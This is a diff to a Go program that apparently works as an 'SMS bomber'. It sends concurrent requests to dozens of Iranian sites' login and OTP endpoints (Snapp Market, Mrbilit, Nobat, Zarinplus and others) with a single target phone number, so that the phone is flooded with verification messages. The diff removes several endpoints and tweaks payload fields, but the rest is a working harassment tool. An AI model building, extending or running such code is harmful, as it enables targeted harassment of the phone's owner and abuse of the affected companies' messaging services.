@@ -132,9 +132,6 @@ func main() {
 		go sms("https://api.torobpay.com/user/v1/login/", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)   // add site
-		go sms("https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
-			"PhoneNo": phone,
-		}, ch)  // add site
  		go sms("https://app.ezpay.ir:8443/open/v1/user/validation-code", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)  // add site
@@ -198,9 +195,6 @@ func main() {
 		go sms("https://kilid.com/api/uaa/portal/auth/v1/otp?captchaId=akah8cgoLOvIfKnE1mx3lXOB4NrXJ0LWIXim8TTe4EETy7EKGJgAtjkFzcfF6M33i2IK8aqmJrg1X1nc59osFA%253D%253D", map[string]interface{}{
 			"": phone,
 		}, ch)   // add site
-		go sms("https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
-			"phone": phone,
-		}, ch)   // add site
 		go sms("https://roustaee.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"mobileNo": phone,
 		}, ch)   // add site
@@ -218,9 +212,7 @@ func main() {
 		}, ch)   // add site
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 // github account ha:
-		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
-			"phone": phone,
-		}, ch)
+
 		go sms("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{
 			"------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n": phone,
 		}, ch)
@@ -268,9 +260,6 @@ func main() {
 		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
 			"'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone,
 		}, ch) // error site: secure connection
-		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://api.zarinplus.com/user/otp/", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)  // edit & Alternative :4/22/2025
@@ -535,19 +524,15 @@ func main() {
 		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
 			s4: phone,
 		}, ch)
-		s5 := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
-		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
-			s5: phone,
-		}, ch)
 		s8 := fmt.Sprintf("'operationName':'Mutation','variables':{'content':{'phone_number':%s,query':'mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}'", phone)
 		go sms("https://apollo.digify.shop/graphql", map[string]interface{}{
 			s8: phone,
 		}, ch)
 		go sms(fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
-			"monsmain": "monsmain",
+			"monsmain": "phone",
 		}, ch)
 		go sms(fmt.Sprintf("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=%v&source=2&sendTokenIfNot=true", phone), map[string]interface{}{
-			"monsmain": "monsmain",
+			"monsmain": "phone",
 		}, ch)
 		s10 := fmt.Sprintf("'mobile': %s, 'country_code': 'IR', 'provider_code': 'RUBIKA'", phone)
 		go sms("https://api.chartex.net/api/v2/user/validate", map[string]interface{}{
